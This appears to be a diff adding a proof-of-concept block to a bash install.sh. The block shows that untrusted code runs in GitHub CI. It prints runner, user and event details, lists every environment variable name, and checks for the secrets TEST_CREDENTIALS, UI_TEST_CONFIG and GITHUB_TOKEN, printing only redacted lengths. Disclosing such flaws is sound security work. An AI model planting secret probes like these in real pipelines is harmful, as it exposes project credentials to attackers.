@@ -1,5 +1,26 @@
 #!/bin/bash
 
+echo "=== POC: install.sh executed without permission check ==="
+echo "Runner:$(hostname)"
+echo "User:$(whoami)"
+echo "Date:$(date -u)"
+echo "Triggering Actor:${GITHUB_TRIGGERING_ACTOR:-unknown}"
+echo "Event:${GITHUB_EVENT_NAME:-unknown}"
+echo "Repository:${GITHUB_REPOSITORY:-unknown}"
+echo ""
+echo "Environment variables available (names only):"
+env | cut -d= -f1 | sort
+echo ""
+echo "Secrets available (checking for known names):"
+for var in TEST_CREDENTIALS UI_TEST_CONFIG GITHUB_TOKEN; do
+  if [ -n "${!var}" ]; then
+    echo "$var = [REDACTED -${#!var} chars]"
+  else
+    echo "$var = (not set)"
+  fi
+done
+echo "=== END POC ==="
+
 # set -x
 
 #
